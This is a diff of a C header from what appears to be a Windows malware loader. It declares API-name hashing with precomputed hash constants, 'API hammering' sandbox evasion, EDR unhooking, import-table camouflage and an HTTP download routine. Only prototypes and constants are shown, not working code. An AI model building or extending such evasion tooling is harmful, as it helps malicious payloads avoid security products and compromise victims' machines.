@@ -9,16 +9,6 @@ extern PWSTR url;
 extern PWSTR endpoint;
 extern SIZE_T sSize;
 
-
-// winapi.c
-#define INITIAL_SEED	8
-
-UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
-UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);
-
-#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
-#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))
-
 typedef struct _API_HASHING {
     fnGetTickCount64                pGetTickCount64;
     fnWinHttpOpen                   pWinHttpOpen;
@@ -48,8 +38,8 @@ typedef long(NTAPI* fnRemoveVectoredExceptionHandler)(
 #include "unhook.h"
 
 // apihashing.c
-FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);
-HMODULE GetModuleHandleH(DWORD dwModuleNameHash);
+FARPROC GetProcAddressH(IN HMODULE hModule, IN UINT32 uApiHash);
+HMODULE GetModuleHandleH(IN UINT32 uModuleHash);
 
 // apihammer.c
 BOOL ApiHammering(DWORD Stress);
@@ -59,9 +49,3 @@ DWORD Download(char** response, PVOID url, PVOID endpoint, BOOL ssl);
 
 //iatcamo.c
 VOID IatCamouflage();
-
-//dllmain.c
-
-#define kernel32dll_JOAA                     0x20666D0D
-#define AddVectoredExceptionHandler_JOAA     0x1E73D3C6
-#define RemoveVectoredExceptionHandler_JOAA  0xE35AA59E
